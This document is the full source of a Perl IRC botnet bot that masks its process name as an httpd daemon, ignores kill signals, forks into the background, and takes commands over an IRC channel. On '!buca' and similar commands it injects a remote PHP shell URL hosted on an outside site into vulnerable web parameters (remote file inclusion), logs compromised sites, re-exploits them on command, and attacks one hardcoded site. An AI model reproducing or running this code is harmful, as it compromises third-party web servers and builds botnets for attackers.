#/usr/bin/perl -w
use IO::Socket::INET;
use LWP::UserAgent;
my $processo = "httpd -SascSL"; 
if (`ps aux` =~ /httpd -SascSL/){exit;}
# ----> Configuration <---- #
$server = "irc.mindforge.org";
$idphp = "http://www.proquid.net/images/spr.txt";
$idinj = "http://www.proquid.net/images/spr.txt";
$idinj2 = "http://www.proquid.net/images/spr.txt";
$nick = "t00l[BN-".int(rand(101))."]";
$channel = "#r0x";
$pwd= "suca";
# ----> E0F Configuration <---- #
$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'}   = 'IGNORE';
$0="$processo"."\0"x16; 
my $pid=fork; 
exit if $pid; 
die "Problem with fork!: $!" unless defined($pid);
$irc = IO::Socket::INET->new(PeerAddr => $server,
				PeerPort => 7000, 
				Proto => 'tcp') or die "[-] Error: $!\n";
$irc->autoflush(1); 
print $irc "NICK $nick\r\n";
print $irc "USER l33t 8 * :sf-crew\n";
print $irc "JOIN $channel $pwd\r\n";
print $irc "JOIN #r0x\r\n";
while ($line = <$irc>) {
	print $line;
	if ($line =~ /^PING \:(.*)/) {
		print $irc "PONG :$1"; 
	}
	if($line =~ m/^\:(.+?)\!(.+?)\@(.+?) JOIN \:(.+)/)  {
		$nick   = $1;
        	$ident  = $2;
        	$host   = $3;
        	$chan = $4;
        	
        	#parse($nick, $ident, $host, $target, $msg);
	}
	if ($line =~ /\:!help/) {
		st_irc("SF Scanbot, cmd:\n");
		st_irc("[+] !buca <linkbug>, to exploit with php inj code.");
		st_irc("[+] `state, to know the bot's state.");
                st_irc("[+] !rul, Alza Rulez Control.");
                st_irc("[+] !bnet, rejoin Bot.");
		st_irc("Have fun!");
        }	
	if ($line =~ /:!buca (.*)=/) {
		$linkex = $1. "=".$idphp."???";
		st_irc("9[3+9] 10Exploiting11...");
		own($linkex);		
	}
	if ($line =~ /:!buca (.*)=/) {
		$linkex = $1. "=".$idinj."???";
		st_irc("9[3+9] 10Exploiting..RuleZ11...");
		own($linkex);			
	}
	if ($line =~ /:!st (.*)=/) {
		$linkex = $1. "=".$idinj2."???";
		st_irc2("9[3+9] 10Exploiting..Steamer11...");
		own($linkex);		
	}
	if ($line =~ m/\:(Apache|IIS|Xitami|Casuale|Unknow)|Root|.*JOIN.*/) {
		st_irc("9[3+9] 10Exploit 11Completed!");
		open VULN, ">>", ".vuln.off";
		print VULN $linkex."\n";
		close VULN;	
		pulisci();
        }
	if ($line =~ /:!bnet.*/) {
		if (my $pid = fork) { 
		waitpid($pid, 0); 
		} else { 
		if (fork) { 
		exit; 
		} else { 
		rejoin();
		}
		}
	}	
	if ($line =~ /:`alza SF\|02.*/) {
		i_sf02();
		sleep(5);
		st_irc("Nick Shell Trovato: $nick");
	}
}

sub st_irc {
	$msg = shift;
	print $irc "PRIVMSG #r0x $msg\r\n";
}
sub st_irc2 {
	$msg = shift;
	print $irc "PRIVMSG #r0x $msg\r\n";
}
sub own {

	$linkex = shift;
	eval { # for crash infinte loop
 	$ua = LWP::UserAgent->new;
 	$ua->timeout(10);
 	$ua->env_proxy;
	$ua->agent('Mozilla/5.0');
 	$response = $ua->get($linkex);
	};	
}
	
sub pulisci {
	open VULN, "<", "vuln.off.txt";
	@arr = <VULN>;
	%hash   = map { $_, 1 } @arr; #thanks to perl.it :)
	@unici = keys %hash;
	close VULN;
	open VULN, ">", "vuln.off.txt";
	foreach $el (@unici) {
		print VULN $el;
	}
	close VULN;
}
sub rejoin {
	open VULN, "<", "vuln.off";
	@vuln = <VULN>;
       	foreach $li (@vuln) {
         		own($li);
	}
	st_irc("9[3+9]9[3Bot-Net9] 10Rejoin 11Finished!");
}
sub i_sf02 {
	own("http://www.sres.pt/index.php?page=http://rollarefamale.altervista.org/dolce?");
	
}
